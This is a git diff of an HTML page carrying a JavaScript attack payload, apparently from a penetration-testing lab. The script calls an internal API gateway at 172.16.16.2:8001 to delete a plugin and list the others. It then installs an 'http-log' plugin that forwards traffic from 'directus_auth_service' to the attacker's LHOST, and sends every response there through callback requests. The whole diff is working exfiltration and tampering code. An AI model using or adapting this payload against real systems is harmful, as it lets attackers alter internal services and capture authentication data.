@@ -1,8 +1,7 @@
 <html>
-
 <head>
 <script>
-let LHOST = "192.168.45.194";
+let LHOST = "192.168.45.152";
 
 run = () => {
 	fetch("http://" + LHOST + "/init?msg=JS-injection-running!");
@@ -10,7 +9,39 @@ run = () => {
 }
 
 exfiltrate = () => {
-	fetch("http://172.16.16.2:8001/")
+	fetch("http://172.16.16.2:8001/plugins/ff36578e-7a0e-4d24-a377-7010ba7d2dfe", {
+		method: "DELETE"
+	})
+	.then((response) => response.text())
+	.then((data) => {
+		fetch("http://" + LHOST + "/callback?data=" +  encodeURIComponent(data));
+	}).catch((err) => {
+		fetch("http://" + LHOST + "/error?data=" + encodeURIComponent(err));
+	})
+
+
+	fetch("http://172.16.16.2:8001/plugins", {
+		method: "GET"
+	})
+	.then((response) => response.text())
+	.then((data) => {
+		fetch("http://" + LHOST + "/callback?data=" +  encodeURIComponent(data));
+	}).catch((err) => {
+		fetch("http://" + LHOST + "/error?data=" + encodeURIComponent(err));
+	})
+
+	fetch("http://172.16.16.2:8001/services/directus_auth_service/plugins", {
+		method: "POST",
+		headers: { "Content-Type": "application/json" },
+		body: JSON.stringify({
+			"name": "http-log", 
+			"config": {
+				"http_endpoint": "http://" + LHOST + "/log",
+				"method": "POST",
+				"content_type": "application/json"
+			}
+		})
+	})
 	.then((response) => response.text())
 	.then((data) => {
 		fetch("http://" + LHOST + "/callback?data=" +  encodeURIComponent(data));
